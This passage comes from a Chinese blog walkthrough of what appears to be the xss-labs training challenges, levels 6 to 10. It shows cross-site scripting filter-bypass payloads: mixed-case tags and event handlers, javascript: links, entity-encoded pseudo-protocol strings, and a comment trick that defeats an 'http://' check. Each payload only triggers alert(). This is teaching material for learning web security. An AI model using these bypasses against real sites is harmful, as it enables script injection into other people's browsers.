class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现大小写没有被过滤掉，这题能利用大小写进行绕过，所以我们可以用下面的方法，构造payload</p><blockquote><p>​<code>&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</code>​</p><p>​<code>&quot; Onfocus=javascript:alert() &quot;</code>​</p><p>​<code>&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;</code>​</p></blockquote><p>完事查看一下这关的源码</p><p><img src="/.com//27f57d04b99b48c93ac4afdc07754bdb-20250425093223-69ci25u.png" alt="27f57d04b99b48c93ac4afdc07754bdb"></p><p>这关甚至还过滤掉了data，但是没有添加小写转化函数 ，导致能用大写绕过</p><p> <strong>本关小结</strong>：大小写法绕过str_replace()函数</p><hr><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>老规矩了，先上关键字试试看</p><blockquote><p>​<code>&quot; OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level8.php?keyword=nice try!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level7<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level7<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;quot;</span> onfocus <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level7.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">focus</span> &lt;&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> =<span class="hljs-string">java:alert()</span>&gt;</span>&quot;&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level7.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:28<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>发现传的值变成<code>&quot; focus &lt;&gt; &lt;a =java:alert()&gt;&quot;</code>​</p></blockquote><p>不难发现，这里面进行了小写转化，将检测出来的on，script，href给删掉了，但是没有关系，我们可以利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p><blockquote><p>​<code>javascript:alert()</code>​</p></blockquote><p>利用在线工具进行Unicode编码后得到，<a href="https://www.matools.com/code-convert-unicode" title="在线Unicode编码解码">在线Unicode编码解码</a></p><blockquote><p>​<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</code>​</p></blockquote><p><strong>本关小结</strong>： href属性自动解析Unicode编码</p><hr><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>老套路，先输入一个123试试呢</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level8<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level8<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level8.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;123&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level8.jpg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:3<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输入的值插入了两个地方，第一个是input标签，第二个是href属性，老方法，先看看过滤了啥关键字</p><blockquote><p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level8<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level8<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level8.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;quot;</span> src data onfocus <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;quot sr_c da_ta o_nfocus &lt;scr_ipt&gt; &lt;a hr_ef=javascr_ipt:alert()&gt;&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level8.jpg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:65<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以发现，input标签添加了html实体转化函数还把双引号也给实体化了， 添加了小写转化函数，还有过滤掉了src、data、onfocus、href、script、”（双引号），难搞哦，看一下这关的源码</p><p><img src="/.com//99dede9426bbb01b41cfd33ffcd9db8d-20250425095703-192nk6o.png" alt="99dede9426bbb01b41cfd33ffcd9db8d"></p><p>果然，但是我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p><blockquote><p>​<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</code>​</p><p>javascript:alert()&#x2F;* http:&#x2F;&#x2F; *&#x2F;</p></blockquote><p><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</p><hr><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p>老套路，看看过滤了啥子</p><blockquote><p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level9<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level9<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level9.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;quot;</span> src data onfocus <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;amp;</span>#106;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;您的链接不合法？有没有！&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level9.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:72<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>里呢，当false等于false的时候(就是传入的值没有http:&#x2F;&#x2F;)就会执行if，为了防止false===false，我们需要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗，让函数strpos返回一个数字，构造payload</p><blockquote><p>​<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</code>​</p><p>javascript:alert()&#x2F;* http:&#x2F;&#x2F; *&#x2F;</p></blockquote><p><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</p><hr><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和well done!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:10<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里可以看到，Get传参的值，只插入了h2标签里头，额那下面的input标签啥东西，还隐藏掉了</p><p>不管那么多，老规矩，先测试一下关键字</p><blockquote><p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span 